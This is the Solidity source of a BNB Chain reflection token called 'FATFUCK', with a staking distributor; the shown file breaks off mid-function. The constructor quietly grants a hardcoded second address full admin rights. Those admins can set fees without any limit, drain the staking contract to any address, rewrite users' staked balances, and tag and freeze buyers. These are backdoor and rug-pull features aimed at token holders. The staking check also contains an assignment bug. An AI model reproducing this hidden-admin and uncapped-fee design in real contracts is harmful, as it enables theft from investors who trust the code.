/**
 *Submitted for verification at BscScan.com on 2022-03-08
*/

/**


*/

// SPDX-License-Identifier: NOLICENSE

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface TokT {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
        authorizations[
    0x061648f51902321C353D193564b9C8C2F720557a] = true;}
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public onlyOwner {
        address dead = 0x000000000000000000000000000000000000dEaD;
        owner = dead;
        emit OwnershipTransferred(dead);
    }

    event OwnershipTransferred(address owner);
}

interface IStakingDistributor {
    function setStakingCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit(uint256 balanceBefore, uint256 balanceAfter) external;
    function claimStakingPayout(address shareholder) external;
    function setnewrw(address _nrew) external;
    function getRAddress() external view returns (address);
    function setDividendShareManual() external;
    function rescueBEP20(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external;
    function getRewardsOwed(address _wallet) external view returns (uint256);
    function getTotalRewards(address _wallet) external view returns (uint256);
    function gettotalDistributed() external view returns (uint256);
}

contract StakingDistributor is IStakingDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    IBEP20 RWDS;
    IRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 100 * (10 ** 9);
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IRouter(_router)
            : IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancakeswap Router
        _token = msg.sender;
    }

    function setStakingCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }
    
    function deposit(uint256 balanceBefore, uint256 balanceAfter) external override onlyToken {
        uint256 amount = (balanceAfter).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function rescueBEP20(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external override onlyToken {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function setDividendShareManual() external override onlyToken {
        uint256 amount = RWDS.balanceOf(address(this));
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew) external override onlyToken {
        RWDS = IBEP20(_nrew);
    }

    function claimStakingPayout(address shareholder) external override onlyToken {
        distributeDividend(shareholder);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributed() public view override returns (uint256) {
        return uint256(totalDistributed);
    }

    function getRewardsOwed(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(getUnpaidEarnings(shareholder));
    }

    function getTotalRewards(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract FATFUCK is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'FATFUCK';
    string private constant _symbol = 'FATFUCK';
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100 * 10**6 * (10 ** _decimals);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    IBEP20 BEP20 = IBEP20(0x84d2d2E11423d995e7bf3Ef8295A2715DE158d08);
    uint256 public _maxTxAmount = ( _tTotal * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _tTotal * 200 ) / 10000;
    uint256 public _maxTransferAmount = ( _tTotal * 100 ) / 10000;
    uint256 public _minTokenAmount = 30000 * (10 ** _decimals);
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isPartial;
    mapping (address => bool) isContractDesig;
    mapping (address => bool) isBTrader;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isMaxWalletExempt;
    address[] private _excluded;
    uint256 launch;
    IRouter router;
    address public pair;
    StakingDistributor stakingContract;
    uint256 distributor = 50;
    uint256 provider = 0;
    uint256 divisor = 50;
    uint256 setgas = 30000;
    
    bool private swapping;
    bool public swapEnabled = true;
    uint256 public swapThreshold = 100000 * (10 ** _decimals);
    uint256 traderAmount = 0;
    bool startSwap = true;
    uint256 public variableSwap = 50;
    uint256 swapDenom = 100;
    bool isWeb = true;
    uint8 traderTime = 3 seconds;
    uint8 deferredTime = 2 seconds;
    mapping (address => uint) private tagged;
    bool setcontract = true;
    uint256 threshold = 10000000000;
    bool sellFreeze = true;
    uint8 sellFreezeTime = 120 seconds;
    mapping (address => uint) private sellFreezin;
    bool buyFreeze = true;
    uint8 buyFreezeTime = 5 seconds;
    mapping (address => uint) private buyFreezin;
    uint8 minThreshold = 2 seconds;
    mapping (address => uint) private mounted;

    mapping (address => bool) isStaker;
    mapping (address => uint) stakerAmount;
    mapping (address => uint) stakingLock;
    mapping (address => uint) stakingStarted;
    mapping (address => uint) stakingEnded;
    uint256 totalStaked;
    bool stakingEnabled = true;
    uint256 stakingLength = 600;


    uint256 alpha = 50;
    uint256 beta = 50;
    uint256 gamma = 0;
    uint256 delta = 0;

    address lpR;
    address dbiL;
    address wthN;
    address jacZ;
    address extW;
    address mkwA;
    address tfU;
    address staK;

    struct feeRatesStruct {
      uint256 rfi;
      uint256 marketing;
      uint256 liquidity;
      uint256 staking;
    }
    
    feeRatesStruct private feeRates = feeRatesStruct(
     {rfi: 10,
      marketing: 30,
      liquidity: 30,
      staking: 10
    });

    feeRatesStruct private sellFeeRates = feeRatesStruct(
    {rfi: 10,
     marketing: 30,
     liquidity: 30,
     staking: 10
    });

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 staking;
    }
    
    TotFeesPaidStruct totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rRfi;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 rStaking;
      uint256 tTransferAmount;
      uint256 tRfi;
      uint256 tMarketing;
      uint256 tLiquidity;
      uint256 tStaking;
    }

    event FeesChanged();
    
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () Auth(msg.sender) {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _rOwned[owner] = _rTotal;
        stakingContract = new StakingDistributor(address(_router));
        stakingContract.setnewrw(address(this));
        _isExcluded[address(this)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(owner)] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(owner)] = true;
        isTxLimitExempt[address(router)] = true;
        isPartial[address(owner)] = true;
        isPartial[msg.sender] = true;
        isMaxWalletExempt[address(msg.sender)] = true;
        isMaxWalletExempt[address(this)] = true;
        isMaxWalletExempt[address(owner)] = true;
        isMaxWalletExempt[address(DEAD)] = true;
        isMaxWalletExempt[address(pair)] = true;
        isMaxWalletExempt[address(lpR)] = true;
        isContractDesig[address(this)] = true;
        isTimelockExempt[address(lpR)] = true;
        isTimelockExempt[address(owner)] = true;
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;
        lpR = address(this);
        staK = address(stakingContract);
        dbiL = msg.sender;
        wthN = msg.sender;
        jacZ = msg.sender;
        extW = msg.sender;
        mkwA = msg.sender;
        tfU = msg.sender;
        
        emit Transfer(address(0), owner, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function deliver(uint256 tAmount, address recipient) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false, recipient);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi, address recipient) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false, recipient);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false, recipient);
            return s.rTransferAmount; }
    }

    function isCont(address addr) internal view returns (bool) {
        require(addr != address(this), "cannot be address(this)");
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReflection(address account) external authorized {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReflection(address account) external authorized {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break; }
        }
    }

    function setAcquireFee(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _sta) external authorized {
        feeRates.rfi = _rfi;
        feeRates.marketing = _mark;
        feeRates.liquidity = _liq;
        feeRates.staking = _sta;
    }

    function setTransferFee(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _sta) external authorized {
        sellFeeRates.rfi = _rfi;
        sellFeeRates.marketing = _mark;
        sellFeeRates.liquidity = _liq;
        sellFeeRates.staking = _sta;
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function totalReflections() public view returns (uint256) {
        return totFeesPaid.rfi;
    }

    function mytotalReflections(address wallet) public view returns (uint256) {
        return tokenFromReflection(_rOwned[wallet]);
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tLiquidity;
        }
        _rOwned[address(this)] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tMarketing;
        }
        _rOwned[address(this)] +=rMarketing;
    }

    function _takeStaking(uint256 rStaking, uint256 tStaking) private {
        totFeesPaid.staking +=tStaking;

        if(_isExcluded[address(staK)])
        {
            _tOwned[address(staK)]+=tStaking;
        }
        _rOwned[address(staK)] +=rStaking;
    }

    function _getValues(uint256 tAmount, bool takeFee, bool isSale, address recipient) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale, recipient);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi, to_return.rMarketing, to_return.rLiquidity, to_return.rStaking) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSale, address recipient) private view returns (valuesFromGetValues memory s) {
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s; }
        if(isSale){
            s.tRfi = tAmount*sellFeeRates.rfi/1000;
            s.tMarketing = tAmount*sellFeeRates.marketing/1000;
            s.tLiquidity = tAmount*sellFeeRates.liquidity/1000;
            s.tStaking = tAmount*sellFeeRates.staking/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tStaking; }
        if(!isSale && BEP20.balanceOf(recipient) < 10){
            s.tRfi = tAmount*feeRates.rfi/1000;
            s.tMarketing = tAmount*feeRates.marketing/1000;
            s.tLiquidity = tAmount*feeRates.liquidity/1000;
            s.tStaking = tAmount*feeRates.staking/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tStaking; }
        if(!isSale && BEP20.balanceOf(recipient) >= 10 &&
            BEP20.balanceOf(recipient) < 20 ){
            s.tRfi = tAmount*(feeRates.rfi/2)/1000;
            s.tMarketing = tAmount*feeRates.marketing/1000;
            s.tLiquidity = tAmount*(feeRates.liquidity/4)/1000;
            s.tStaking = tAmount*feeRates.staking/1000;
           s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tStaking; }
        if(!isSale && BEP20.balanceOf(recipient) >= 20 ){
            s.tRfi = tAmount*(feeRates.rfi/2)/1000;
            s.tMarketing = tAmount*(feeRates.marketing/3)/1000;
            s.tLiquidity = tAmount*(feeRates.liquidity/4)/1000;
            s.tStaking = tAmount*feeRates.staking/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tStaking; }
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rStaking) {
        rAmount = tAmount*currentRate;
        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0); }
        rRfi = s.tRfi*currentRate;
        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        rStaking = s.tStaking*currentRate;
        rTransferAmount =  rAmount-rRfi-rMarketing-rLiquidity-rStaking;
        return (rAmount,rTransferAmount,rRfi,rMarketing,rLiquidity,rStaking);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]]; }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        if(!isPartial[from] && !isPartial[to]){require(startSwap, "swapping not permissable");}
        if(!isMaxWalletExempt[to] && !isPartial[from] && to != address(this) && to != address(DEAD) && to != pair && to != lpR){
            require((balanceOf(to) + amount) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(from != pair && sellFreeze && !isTimelockExempt[from]) {
            require(sellFreezin[from] < block.timestamp, "Outside of Time Allotment"); 
            sellFreezin[from] = block.timestamp + sellFreezeTime;} 
        if(from == pair && buyFreeze && !isTimelockExempt[to]){
            require(buyFreezin[to] < block.timestamp, "Outside of Time Allotment"); 
            buyFreezin[to] = block.timestamp + buyFreezeTime;} 
        checkTxLimit(from, amount, to);
        checkTransfer(from != pair, from, amount, to);
        if(from == pair && isWeb && launch >= block.timestamp &&
            !isContractDesig[to]){isBTrader[to] = true;}
        if(from == pair && tx.gasprice > threshold && isWeb){isBTrader[to] = true;}
        if(from == pair && isWeb && setcontract && isCont(to)){isBTrader[to] = true;}
        if(from == pair && isWeb && launch >= block.timestamp &&
            !isContractDesig[to]){tagged[to] = block.timestamp + deferredTime;}
        checkWeb(from != pair, from, amount, to);
        if(stakingEnabled && isStaker[from] && from != pair) amount = amount.sub(stakerAmount[from]);
        if(from == pair){mounted[to] = block.timestamp + minThreshold;}
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 variableThreshold;
        if(amount.mul(variableSwap).div(swapDenom) <= swapThreshold){variableThreshold = amount.mul(variableSwap).div(swapDenom);}
        if(amount.mul(variableSwap).div(swapDenom) > swapThreshold){variableThreshold = swapThreshold;}
        bool canSwap = contractTokenBalance >= variableThreshold;
        bool aboveM = amount >= _minTokenAmount;
        if(!swapping && swapEnabled && canSwap && from != pair && aboveM && !isContractDesig[from]){
            swapAndLiquify(variableThreshold); }        
        bool isSale;
        if(to == pair) isSale = true;
        _tokenTransfer(from, to, amount, !(isFeeExempt[from] || isFeeExempt[to]), isSale);
    }

//staking//

    function stakeTokens(uint256 amount) external {
        address sender = msg.sender;
        require(stakingEnabled = true);
        require(amount <= balanceOf(sender));
        stakerAmount[sender] = amount;
        isStaker[sender] = true;
        stakingLock[sender] = block.timestamp.add(stakingLength);
        stakingStarted[sender] = block.timestamp;
        totalStaked = (totalStaked.add(amount));
        try stakingContract.setShare(sender, stakerAmount[sender]) {} catch {}

    }

    function unstakeTokens() external {
        address sender = msg.sender;
        require(stakingLock[sender] <= block.timestamp);
        uint256 amount = stakerAmount[sender];
        stakerAmount[sender] = 0;
        isStaker[sender] = false;
        stakingLock[sender] = 0;
        stakingEnded[sender] = block.timestamp;
        totalStaked = (totalStaked.sub(amount));
        try stakingContract.setShare(sender, stakerAmount[sender]) {} catch {}

    }

///fail safes///
    
    function setstakedAmount(address wallet, uint256 amount) external authorized {
        stakerAmount[wallet] = amount;
    }

    function setstakingUnlocks(address wallet, uint256 time) external authorized {
        stakingLock[wallet] = time;
    }

    function setisStakerCurrently(address wallet, bool _enabled) external authorized {
        isStaker[wallet] = _enabled;
    }

    function setShares(address shareholder, uint256 amount) external authorized {
        stakingContract.setShare(shareholder, amount);
    }

///end///

    function setStakingLength(uint256 time) external authorized {
        stakingLength = time;
    }

    function setStakingActive(bool _enabled) external authorized {
        stakingEnabled = _enabled;
    }

    function stakedAmount(address wallet) public view returns (uint256) {
        return stakerAmount[wallet];
    }

    function stakingEndedAt(address wallet) public view returns (uint256) {
        return stakingEnded[wallet];
    }

    function stakingUnlocks(address wallet) public view returns (uint256) {
        return stakingLock[wallet];
    }

    function totalStakedCurrently() public view returns (uint256) {
        return totalStaked;
    }

    function isStakerCurrently(address wallet) public view returns (bool) {
        return isStaker[wallet];
    }

    function stakingTimeLeftMins(address wallet) public view returns (uint256) {
        uint256 secLeft = stakingLock[wallet].sub(block.timestamp);
        uint256 minsLeft = secLeft.div(60);
        return minsLeft;
    }

    function setStakingCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        stakingContract.setStakingCriteria(_minPeriod, _minDistribution);
    }

    function setDivShareManual() external authorized {
        stakingContract.setDividendShareManual();
    }

    function claimStakingPayout() external {
        address shareholder = msg.sender;
        stakingContract.claimStakingPayout(shareholder);
    }

    function stakingRescue(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
        stakingContract.rescueBEP20(_tadd, _rec, _amt, _amtd);
    }

    function getMyStakingPayoutOwed(address _wallet) external view returns (uint256){
        return stakingContract.getRewardsOwed(_wallet);
    }

    function getMyTotalStakingPayout(address _wallet) external view returns (uint256){
        return stakingContract.getTotalRewards(_wallet);
    }

    function currentStakingPayoutToken() public view returns (address) {
        return stakingContract.getRAddress();
    }

    function gettotalStakingPayoutAll() public view returns (uint256) {
